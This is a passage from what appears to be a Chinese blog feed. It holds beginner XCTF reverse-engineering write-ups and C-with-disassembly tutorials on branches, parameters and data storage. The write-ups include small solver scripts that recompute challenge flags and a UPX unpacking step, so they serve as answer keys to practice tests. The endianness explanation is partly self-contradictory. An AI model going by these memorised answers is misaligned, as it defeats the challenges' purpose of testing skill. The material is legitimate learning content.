srcset="/img/loading.gif" alt="-w734"><br>运行就拿到了flag。</p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p>根据题目描述：菜鸡发现Flag似乎并不一定是明文比较的<br>肯定是进行了某种加密。</p><h3 id="先查壳"><a href="#先查壳" class="headerlink" title="先查壳"></a>先查壳</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733878960896.jpg" srcset="/img/loading.gif" alt="-w544"><br>无壳，32位c++程序</p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733879199369.jpg" srcset="/img/loading.gif" alt="-w431"><br>输入正确的serial，会提示正确。</p><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733881777919.jpg" srcset="/img/loading.gif" alt="-w602"><br>进入main函数，F5大法查看伪代码<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733882559724.jpg" srcset="/img/loading.gif" alt="-w511"><br>发现是v10数组与v13数组逐对比后，如果相同就会输出正确的字眼。前面有对用户输入的v9进行一些处理，处理完后会放入v10中。下面具体分析一下如何处理就可以了，主要在sprintf函数和strcat函数。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733887654757.jpg" srcset="/img/loading.gif" alt="-w379"><br>点击进去看到<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733887851687.jpg" srcset="/img/loading.gif" alt="-w555"><br><img src="/2019/11/09/Xctfre_新手区wp/images/15733888354402.jpg" srcset="/img/loading.gif" alt="-w632"><br>那就很清楚了，就是把v4字符串也就是刚刚输入的字符串进行格式化位16进制的整数输出到v8中，然后用strcat函数把处理后的v8放入v10。（此处原来的v10是空的，所以连接v10和v8，实际相当于把v8放入v10）</p><p>接下来就是v10与v13进行对比，v13是刚刚复制过来的<code>437261636b4d654a757374466f7246756e</code>，那就可以看出来咱们直接把这个进行16进制转回去就可以了。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733891570437.jpg" srcset="/img/loading.gif" alt="-w526"></p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p>这道题是拿到了一段c源码，打开发现关键处：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733897127019.jpg" srcset="/img/loading.gif" alt="-w1023"><br>可以看出来把<code>first second strlen(argv[3])</code>搞清楚是什么就可以了。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733897938110.jpg" srcset="/img/loading.gif" alt="-w590"><br>很简单可以看出这3个是什么值，下面直接放解密代码：</p><pre><code>#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;iostream&gt;int main(int argc, char *argv[]) {    unsigned int hash = 0xcafe * 31337 + (25 % 17) * 11 + strlen(&quot;h4cky0u&quot;) - 1615810207;    printf(&quot;Get your key: &quot;);    printf(&quot;%x\n&quot;, hash);    return 0;}</code></pre><p>拿到flag：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733900988974.jpg" srcset="/img/loading.gif" alt="-w603"></p><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个看题目就是知道加了壳。且是个二进制文件，丢进edb看一下。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733910805939.jpg" srcset="/img/loading.gif" alt="-w685"></p><p>单步调试走一会，在寄存器窗口看到：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15733910639998.jpg" srcset="/img/loading.gif" alt="-w1019"><br>这很明显是加了UPX壳。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733911418603.jpg" srcset="/img/loading.gif" alt="-w733"><br>这里就用<code>upx -d</code>直接一键脱壳。以后可以练习手动脱upx壳。<br>脱壳完成后用IDA进行分析：</p><h3 id="IDA静态分析-1"><a href="#IDA静态分析-1" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15733913704154.jpg" srcset="/img/loading.gif" alt="-w617"><br>打开直接出现了flag，这个题就考个识别壳和upx脱壳了。</p><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741646328276.jpg" srcset="/img/loading.gif" alt="-w569"><br>先查看一下，无壳，elf 64位应用。</p><h3 id="IDA静态分析-2"><a href="#IDA静态分析-2" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741650120350.jpg" srcset="/img/loading.gif" alt="-w442"><br>点击此处出现了：<br><img src="/2019/11/09/Xctfre_新手区wp/images/15741650432513.jpg" srcset="/img/loading.gif" alt="-w493"><br>确认关键代码段。开始对这个循环进行分析，需要对v8 v7 v9重点分析。<br><img src="/2019/11/09/Xctfre_新手区wp/images/15741657131708.jpg" srcset="/img/loading.gif" alt="-w1026"><br>这里面难点就在如何对v8的理解。</p><h3 id="v8与关键加密分析"><a href="#v8与关键加密分析" class="headerlink" title="v8与关键加密分析"></a>v8与关键加密分析</h3><p>v8是一个_int64也就是long long类型的数值，其存入内存需要变成16进制的数值存入。<img src="/2019/11/09/Xctfre_新手区wp/images/15741666120370.jpg" srcset="/img/loading.gif" alt="-w496"><br>刚刚我们注意到这个x86框架x64的程序，其在内存是用小端序存入的，也就是地址高位放数值高位，地址低位放地址低位。那么其放好就是<img src="/2019/11/09/Xctfre_新手区wp/images/15741662400799.jpg" srcset="/img/loading.gif" alt="-w226"><br>正好是反过来的。<br>然后分析一下加密代码，这主要就是指针知识了：<br><code>v4 = (unsigned int)(char)(*((_BYTE *)&amp;v8 + i % v7) ^ v9[i]);</code><br>这里的（char）是给long long强制转型，然后为了后面的以2位16进制数也就是一个字节，来读取数值。<code>i % v7</code>其是就是控制i = 0—6正好把这个v8给正确读取完。然后一位位取完v8后开始跟v9异或。</p><h3 id="脚本解密"><a href="#脚本解密" class="headerlink" title="脚本解密"></a>脚本解密</h3><pre><code>#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    int v6;    char v7[]=&quot;harambe&quot;;    v6 = 7;    char v8[18];    strcpy(v8, &quot;:\&quot;AL_RT^L*.?+6/46&quot;);    char s[18];    int i;    for ( i = 0; i &lt; strlen(v8); ++i) {        s[i] =v7[i%v6]^v8[i];    }    for (int j = 0; j &lt; strlen(v8); ++j) {        printf(&quot;%c&quot;,s[j]);    }    return 0;}</code></pre><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741669073968.jpg" srcset="/img/loading.gif" alt="-w402"></p><h3 id="对于大小端序的知识补充"><a href="#对于大小端序的知识补充" class="headerlink" title="对于大小端序的知识补充"></a>对于大小端序的知识补充</h3><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741673443772.jpg" srcset="/img/loading.gif" alt="-w718"><br>数据类型为字节型( BYTE)时，其长度为1个字节,保存这样的数据时，无论采用大端序还是小端序，字节顺序都是一样的。<strong>但是数据长度为2个字节以上(含2个字节)时，采用不同字节序保存它们形成的存储顺序是不同的。采用大端序存储数据时，内存地址低位存储数据的高位，内存地址高位存储数据的低位，这是一种最直观的字节存储顺序;采用小端序存储数据时,地址高位存储数据的高位，地址低位存储数据的低位，这是一种逆序存储方式，保存的字节顺序被倒转，它是最符合人类思维的字节序。</strong></p><p><strong>强调</strong>：只有数据长度在2个字节以上时，即数据为多字节数据时，选用大端序还是小端序会导致数据的存储顺序不同。字符串“abcde” 被保存在一个字符 ( Char )数组str中,字符数组在内存中是连续的，此时向字符数组存放数据，无论采用大端序还是小端序，存储顺序都相同。</p><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p><img src="/2019/11/09/Xctfre_新手区wp/images/15741680757822.jpg" srcset="/img/loading.gif" alt="-w764"><br>这个没什么好说的，主函数点击一下他要打印的字符串就可以看到了flag，当然shift + f12也是可以看到。</p><h2 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h2><h2 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h2><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Xctf-RE新手区WP&quot;&gt;&lt;a href=&quot;#Xctf-RE新手区WP&quot; class=&quot;headerlink&quot; title=&quot;Xctf_RE新手区WP&quot;&gt;&lt;/a&gt;Xctf_RE新手区WP&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="Re" scheme="http://chumen77.xyz/tags/Re/"/>
    
      <category term="WP" scheme="http://chumen77.xyz/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>C语言与反汇编学习（四）</title>
    <link href="http://chumen77.xyz/2019/10/23/C%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>http://chumen77.xyz/2019/10/23/C语言与反汇编学习（四）/</id>
    <published>2019-10-23T14:48:14.000Z</published>
    <updated>2020-02-28T07:53:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（四）"><a href="#C语言与反汇编学习（四）" class="headerlink" title="C语言与反汇编学习（四）"></a>C语言与反汇编学习（四）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习以下内容</p><ol><li>内存图</li><li>全局变量、局部变量</li><li>函数参数的分析</li><li>分支语句:<code>if</code> <code>if...else...</code> <code>if..else if..else if....else</code>分支语句的嵌套使用``的正向与逆向分析</li></ol><h2 id="内存图"><a href="#内存图" class="headerlink" title="内存图"></a>内存图</h2><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15718432593875.jpg" srcset="/img/loading.gif" alt="-w301"><br>在电脑中任何一个程序运行时，其会在内存中分成以上图中的几个区域。详细每个区是怎么样的，直接看图即可。</p><h2 id="全局变量、局部变量"><a href="#全局变量、局部变量" class="headerlink" title="全局变量、局部变量"></a>全局变量、局部变量</h2><pre><code>int g_n = 10; //全局变量int Funcation() //代码区，调用时执行{    int x = 1;//局部变量    int y = 3;    return g_n+x+y;    }}</code></pre><p>就用这个代码段来分析。</p><h3 id="全局变量的特点"><a href="#全局变量的特点" class="headerlink" title="全局变量的特点"></a>全局变量的特点</h3><p>1、全局变量在程序编译完成后地址就已经确定下来了，<strong>只要程序启动，全局变量就已经存在了</strong>，启动后里面是否有值取决于声明时是否给定了初始值，如果没有，默认为0。<br>2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.<br>3、全局变量所占内存会一直存在，知道整个进程结束.<br>4、全局变量的反汇编识别：<code>MOV 寄存器,byte/word/dword ptr ds:[0x12345678]</code><br>通过寄存器的宽度，或者byte/word/dword 来判断全局变量的宽度.<strong>全局变量就是所谓的基址</strong>。</p><h3 id="局部变量的特点"><a href="#局部变量的特点" class="headerlink" title="局部变量的特点"></a>局部变量的特点</h3><p>1、局部变量在程序编译完成后并没有分配固定的地址.（因为计算机不知道什么时候会调用这个函数，所以不会提前分配好）<br>2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存.<br>3、当局部变量所属的函数执行完毕后，局部变量所占用的内存将变成垃圾数据.局部变量消失.<br>4、局部变量只能在函数内部使用，函数A无法使用函数B的局部变量.（从堆栈图中也可以想象的到原理）<br>5、局部变量的反汇编识别：<code>[ebp-4]</code>[ebp-8]<code>[ebp-0xC]</code>等等类似的情形。</p><h2 id="函数参数的分析"><a href="#函数参数的分析" class="headerlink" title="函数参数的分析"></a>函数参数的分析</h2><p>如何判断函数有几个参数，已经分别是什么？</p><p>一般情况：<br>    步骤一：观察调用处的代码<br>    push    3<br>    push    2<br>    push    1<br>    call    0040100f</p><p>步骤二：找到平衡堆栈的代码继续论证</p><pre><code>call    0040100fadd     esp,0Ch</code></pre><p>或者函数内部</p><pre><code>ret 4/8/0xC/0x10</code></pre><p>最后，两者一综合，函数的参数个数基本确定.可以应对百分之八十的情况。</p><p>但剩下的百分之二十呢？<br>上面的分析存在的问题：<br>1、<strong>参数传递未必都是通过堆栈，还可能通过使用寄存器</strong>.<br>例：</p><pre><code>push ebxpush eaxmov ecx,dword ptr ds:[esi]mov edx,dword ptr ds:[edi]push 45push 33call 函数地址</code></pre><p>2、<strong>函数调用处的代码无法查看.</strong><br>例：<br>进入函数查看汇编代码：</p><pre><code>00401050   push         ebp00401051   mov         ebp,esp00401053   sub         esp,48h00401056   push        ebx00401057   push        esi00401058   push        edi    00401059   push        ecx    0040105A   lea         edi,[ebp-48h]0040105D   mov         ecx,12h00401062   mov         eax,0CCCCCCCCh00401067   rep stos    dword ptr [edi]00401069   pop         ecx    0040106A   mov         dword ptr [ebp-8],edx0040106D   mov         dword ptr [ebp-4],ecx00401070   mov         eax,dword ptr [ebp-4]00401073   add         eax,dword ptr [ebp-8]00401076   add         eax,dword ptr [ebp+8]00401079   mov         [g_x (00427958)],eax0040107E   pop         edi    0040107F   pop         esi    00401080   pop         ebx    00401081   mov         esp,ebp00401083   pop         ebp    00401084   ret         4        </code></pre><p>观察步骤：<br>1、不考虑ebp、esp<br>2、只找给别人赋值的寄存器<br>eax/ecx/edx/ebx/esi/edi<br>3、找到以后追查其来源，如果，该寄存器中的值，不是在函数内存赋值的，那一定是传进来的参数.<br>**公式一：寄存器 + ret 4\8\0C = 参数个数<br>公式二：寄存器 + [ebp+8]+[ebp+0x] = 参数个数**<br>这两个公式可以互相结合验证看是否算的对。<br>如以上代码段，只可以找到<code>edi,ecx,edx</code>给别人赋值，但是其中<code>edi ecx</code>都是函数内存赋的值，所以只剩下<code>edx</code>，在加上最后的<code>ret 4</code>（这个肯定是push进来了一个参数）就等于2，也就是2个参数。与公式二检验发现没问题，<code>[ebp+0x]</code>类似的只出现一个.</p><h2 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h2><h3 id="正向代码练习"><a href="#正向代码练习" class="headerlink" title="正向代码练习"></a>正向代码练习</h3><p> 练习1:定义4个int类型的全局变量，分别是g_x,g_y,g_z,g_r,使用if..else..分支语句，将最大的值存储到g_r中。<br>    #include “stdafx.h”<br>    int g_x = 5;<br>    int g_y = 3;<br>    int g_z = 7;<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(g_x&gt;g_y)<br>        {<br>            if (g_x&gt;g_z)<br>            {<br>                g_r=g_x;<br>            }<br>            else{<br>                    g_r=g_z;<br>                }<br>        }<br>        else if (g_y &gt; g_z)<br>        {<br>            g_r=g_y;<br>        }<br>        else g_r=g_z;<br>        printf(“%d\n”,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><p>练习2:找出数组里面最大的值，并存储到全局变量中<br>    <img src="/2019/10/23/C语言与反汇编学习（四）/images/15719199995620.jpg" srcset="/img/loading.gif" alt="-w238"><br>    #include “stdafx.h”<br>    int a[4] = {2,5,7,9};<br>    int g_r = 0;<br>    void getMax()<br>    {<br>        if(a[0]&gt;a[1])<br>        {<br>            if (a[0]&gt;a[2])<br>            {<br>                if (a[0]&gt;a[3])<br>                {<br>                    g_r=a[0];<br>                }<br>                else g_r=a[3];<br>            }<br>            else if(a[2]&gt;a[3]){<br>                    g_r=a[2];<br>                }<br>                else g_r=a[3];<br>        }<br>        else if (a[1] &gt; a[2])<br>        {<br>            if (a[1]&gt;a[3])<br>            {<br>                g_r=a[1];<br>            }<br>            else g_r=a[3];<br>        }<br>        else if (a[2] &gt; a[3])<br>        {<br>            g_r=a[2];<br>        }<br>        else g_r=a[3];<br>        printf(“%d\n”,g_r);<br>    }<br>    int main(int argc, char* argv[])<br>    {<br>        getMax();<br>        return 0;<br>    }</p><h4 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h4><p>1：分支语句中if else,及其相互套用，要知道当某个条件成功后，执行其中的代码，然后以后于它的代码都不会再进行判断和执行。<br>2：一个if只对应于一个else，else只能在if后出现与其搭配使用。</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><h4 id="IF语句逆向分析"><a href="#IF语句逆向分析" class="headerlink" title="IF语句逆向分析"></a>IF语句逆向分析</h4><p>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的近end中没有jmp指令。根据以上特征，把jxx指令取反后，即可还原if语句的代码。（<strong>我们要知道jcc代码跳转语句，其判断条件正好跟c的if判断条件是正好反过来的。</strong>）<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719206938300.jpg" srcset="/img/loading.gif" alt="-w262"><br>汇编代码：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719208117580.jpg" srcset="/img/loading.gif" alt="-w331"><br>对于这段代码我们采取一定的分析顺序来分析：</p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   无</li><li>分析全局变量       <code>mov  dword ptr 004225c4,ecx</code></li><li>功能分析:将参数X存到到EAX中，然后比较EAX,与参数Y的大小.如果X&lt;=Y 那么跳转到00401059的位置,否则，将X的值存储到全局变量中</li><li>返回值分析   无</li></ol><p>练习：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719212740917.jpg" srcset="/img/loading.gif" alt="-w367"></p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   <code>[ebp-4]：a</code></li><li>分析全局变量       <code>mov         eax,[004225c4]: m</code> </li><li>功能分析:(省略，直接以c语言代码表示)</li><li>返回值分析   无</li></ol><p><strong>逆为c函数</strong>：</p><pre><code>int m=1;void Funcation(int x, int y){    int a;    a=m;    if(x&lt;=y)    {        y=y+a;        m=y;    }}</code></pre><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719214461732.jpg" srcset="/img/loading.gif" alt></p><h4 id="IF…ELSE…语句逆向分析"><a href="#IF…ELSE…语句逆向分析" class="headerlink" title="IF…ELSE…语句逆向分析"></a>IF…ELSE…语句逆向分析</h4><p>if..ees语句比if语句多出了-一个“else” ，当if表达式结果为真时跳过else分支语句块，当表达式结果为假时跳转到else 分支语句块中。<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719216273356.jpg" srcset="/img/loading.gif" alt="-w226"><br>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else中有的上方有jmp指令。else 代码的结尾没有jmp指令，else 的代码也会执行if _else. _end 的代码。根据以上特征，把jxx指令取反后，即可还原if…ese语句的代码<br><strong>总结：跳转执行一部分代码，不跳转执行另外一部分代码</strong><br>汇编代码：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719219621907.jpg" srcset="/img/loading.gif" alt="-w369"><br>同样安装一定的顺序：</p><p>1：分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code><br>2：分析局部变量   <code>[ebp-4] = eax = [004225c4]</code><br>3：分析全局变量       <code>[004225c4] G</code><br>4：功能分析:比较X与Y的大小，如果X&lt;=Y那么执行<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719249677324.jpg" srcset="/img/loading.gif" alt="-w427"><br>如果X&gt;Y 那么执行<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719249899962.jpg" srcset="/img/loading.gif" alt="-w435"><br>5：返回值分析   无<br><strong>练习：</strong><br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719223446828.jpg" srcset="/img/loading.gif" alt="-w382"></p><ol><li>分析参数：<code>[ebp+8] : X</code>        <code>[ebp+0Ch] :Y</code></li><li>分析局部变量   <code>[ebp-4]：eax:[004225c4]:a</code> <code>[ebp-8]:b:2</code></li><li>分析全局变量       <code>mov         eax,[004225c4]</code> </li><li>功能分析:(省略，直接以c语言代码表示)</li><li>返回值分析   无</li></ol><p><strong>还原成c函数：</strong></p><pre><code>int m=1;void Funcation(int x,int y){    int a,b;    a=m;    b=2;    if (x&gt;=y)    {        b=b+1;        if (x&lt;y)        {            m=b;        }else m=a+b;    }}</code></pre><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719224472672.jpg" srcset="/img/loading.gif" alt></p><h4 id="IF…ELSE-IF…ELSE逆向分析"><a href="#IF…ELSE-IF…ELSE逆向分析" class="headerlink" title="IF…ELSE IF…ELSE逆向分析"></a>IF…ELSE IF…ELSE逆向分析</h4><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719225611187.jpg" srcset="/img/loading.gif" alt="-w307"><br>特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else if中有jmp指令。else if的跳转目的else中有jmp指令，且else码的结尾没有jmp指令，<strong>所有jmp的目标地址一致</strong>。根据以上特征，把jxx指令取反，即可还原if…else if….else语句的代码。<br><strong>如果某个分支没有条件判断，则为else部分</strong>。<br>汇编代码：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719226993158.jpg" srcset="/img/loading.gif" alt="-w334"><br>    函数内部功能分析：<br>    1、分析参数：<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2、分析局部变量    <code>[ebp-4] = A = 0                        [ebp-8] = B = 1                        [ebp-0Ch] = C = 2</code><br>    3、分析全局变量        无<br>    4、功能分析        </p><pre><code>if(x&gt;y)                                {                                    A = B+1;                                }                                else if(x&gt;z)                                {                                    A = C+1;                                }                                else if(x&gt;z)                                {                                    A = B+C                                }                                else                                {                                    A = B+C+1;                                }                                return A;                </code></pre><p>练习：<br><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719228667624.jpg" srcset="/img/loading.gif" alt="-w305"><br>1、分析参数：<code>[ebp+8]    X                        [ebp+0Ch]  Y                        [ebp+10h]  Z</code><br>    2、分析局部变量    <code>[ebp-4] = A                        [ebp-8] = B                        [ebp-0Ch] = C</code><br>    3、分析全局变量        无<br>    4.返回值分析 a+1<br>    还原成C函数：</p><pre><code>int Funcation(int x,int y,int z){    int a=0;    int b=1;    int c=2;    if (x&lt;=y)    {        a=b-1;    }    else if (y&gt;=z)    {        a=c+1;    }    else if (x&gt;z)    {        a=b+c;    }    else a=b+c-1;    return a+1;}</code></pre><p><img src="/2019/10/23/C语言与反汇编学习（四）/images/15719229837839.jpg" srcset="/img/loading.gif" alt></p><h4 id="感悟-1"><a href="#感悟-1" class="headerlink" title="感悟"></a>感悟</h4><p>每个分支类型都有自己的特征点，记清楚这个后，分析起来会容易很多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言与反汇编学习（四）&quot;&gt;&lt;a href=&quot;#C语言与反汇编学习（四）&quot; class=&quot;headerlink&quot; title=&quot;C语言与反汇编学习（四）&quot;&gt;&lt;/a&gt;C语言与反汇编学习（四）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="c与汇编" scheme="http://chumen77.xyz/tags/c%E4%B8%8E%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>C语言与反汇编学习（三）</title>
    <link href="http://chumen77.xyz/2019/10/20/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%B1%87%E7%BC%96%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>http://chumen77.xyz/2019/10/20/C语言学习与反汇编（三）/</id>
    <published>2019-10-20T15:45:40.000Z</published>
    <updated>2020-02-28T07:53:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言与反汇编学习（三）"><a href="#C语言与反汇编学习（三）" class="headerlink" title="C语言与反汇编学习（三）"></a>C语言与反汇编学习（三）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次主要学习一下C语言的数据类型与数据存储。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p><img src="/2019/10/20/C语言学习与反汇编（三）/images/15715865045834.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="学习数据类型的三个要素"><a href="#学习数据类型的三个要素" class="headerlink" title="学习数据类型的三个要素"></a>学习数据类型的三个要素</h3><p>1、存储数据的宽度<br>2、存储数据的格式<br>3、作用范围(作用域)<br>这些都是谈起一个数据类型的基本要素。</p><h3 id="整数类型：char-short-int-long"><a href="#整数类型：char-short-int-long" class="headerlink" title="整数类型：char  short  int long"></a>整数类型：char  short  int long</h3><table><thead><tr><th>char</th><th>8BIT</th><th>1字节</th></tr></thead><tbody><tr><td>short</td><td>16BIT</td><td>2字节</td></tr><tr><td>int</td><td>32BIT</td><td>4字节</td></tr><tr><td>long</td><td>32BIT</td><td>4字节</td></tr></tbody></table><pre><code>char i = 0xFF;short x =0xFF;long y =0xFF;</code></pre><p>我们来看下在汇编其是什么样的：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15715872059570.jpg" srcset="/img/loading.gif" alt="-w505"><br>注意<code>byte word dword</code>的区别。<br>然后我们测试一下以下代码：</p><pre><code>char i = 0x12345678;short x = 0x12345678;long y = 0x12345678;</code></pre><p><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716535773728.jpg" srcset="/img/loading.gif" alt="-w639"><br>然后看到还是<code>byte word dword</code>，并且也没有报错，但是我们运行以后可以看到<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716536656301.jpg" srcset="/img/loading.gif" alt="-w1106"><br><strong>这就说明你写了32位的数给<code>char i</code>这个8位的容器，这是允许的，但是只能装下8位，就从低位开始把78放入。</strong></p><p>整数类型分为有符号(signed)和无符号(unsigned)两种：</p><pre><code>char i = 0xFF;unsigned char i = 0xFF;</code></pre><p>要知道其在内存里存着显示的都是FF<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716703064593.jpg" srcset="/img/loading.gif" alt="-w178"><br>但是输出打印出来一个是255 一个是-1，这就是说明在内存中存储的方式完全一样，但会根据你的定义来确实其是有符号还是无符号。其默认是有符号的，当你想用无符号的时候需要你来定义。并且这个只有在<strong>类型转换和大小比较中特别注意</strong>。因为你直接定义个无符号数，其在内存放的是和原来有符号数一样的，只是你在比较时编译器在编译的时候，<strong>会把其会把汇编代码跳转那里改成特定对应的JCC代码</strong>（只要针对无符号，因为默认是有符号的）。<br>例子：<br>无符号数比较，jcc是JBE，原来没有指定是无符号时，其是JLE（有符号）<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716712689830.jpg" srcset="/img/loading.gif" alt="-w533"><br>总结：1：在内存中存储的方式完全一样 。<br>        2：在类型转换和大小比较中特别注意（运算）。</p><h3 id="浮点类型：float-double"><a href="#浮点类型：float-double" class="headerlink" title="浮点类型：float double"></a>浮点类型：float double</h3><p>float和double在存储方式上都是遵从IEEE的规范的<br>float的存储方式如下图所示：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716717408638.jpg" srcset="/img/loading.gif" alt="-w619"><br>double的存储方式如下图所示：<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716718171405.jpg" srcset="/img/loading.gif" alt="-w729"></p><h4 id="将一个float型转化为内存存储格式的步骤为"><a href="#将一个float型转化为内存存储格式的步骤为" class="headerlink" title="将一个float型转化为内存存储格式的步骤为:"></a>将一个float型转化为内存存储格式的步骤为:</h4><ol><li>先将这个实数的绝对值化为二进制格式</li><li>将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有 效数字的右边。</li><li>从小数点右边第一一位开始数出二十三位数字放入第22到第0位。</li><li>如果实数是正的，则在第31位放入“0”，否则放入“1”。</li><li>如果n是左移得到的，说明指数是正的，第30位放入“1”。如果n是右移得到的或n=0，则第30位放入“0”。</li><li>如果n是左移得到的，则将n减去1后化为二进制，并在左边加“0”补足七位，放入第29到第23位。</li><li>如果n是右移得到的或n=0，则将n化为二进制后在左边加“0’补足七位，再各位求反，再放入第29到第23位。</li></ol><p>这是官方解释。有点麻烦。先练习一个：<br>8.25转成浮点存储<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716720748599.jpg" srcset="/img/loading.gif" alt="-w271"><br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716720864148.jpg" srcset="/img/loading.gif" alt="-w229"><br>所以8.25用二进制表示可表示为1000.01，科学计数法表示一下：1.00001X2^3<br>小数点向左移动3位 指数为3，然后按照上面先放第一个空格0（因为是正数），接着放最后一个大格子00001（科学计数法表示后从小数点后），然后中间格子第一位1（因为是左移小数点），指数3-1=2变成二进制10从右边开始放入。这就是IEEE规范。(可以感受到最麻烦就是中间这段的确定值)<br><img src="/2019/10/20/C语言学习与反汇编（三）/images/15716722496131.jpg" srcset="/img/loading.gif" alt="-w409"><br>按四位分割<code>0100 0001 0000 0100 0000 0000 0000  0000</code>=41040000，然后就这样的形式存入计算机内存。</p><p>我下面用简单的且是正确的办法来转换：<br>将float类型的12.5 转换成16进制：<br>先整理正数部分，12=C=1100<br>小数部分 0.5 * 2=1.0<br>所以二进制就是1100.1，科学计数法 1.1001x2^3<br>这次对中间格子是直接用<code>127+x的结果</code> 变成二进制填充这个格子，x的值就是指数，其中<strong>左移是正右移为负</strong><br> <img 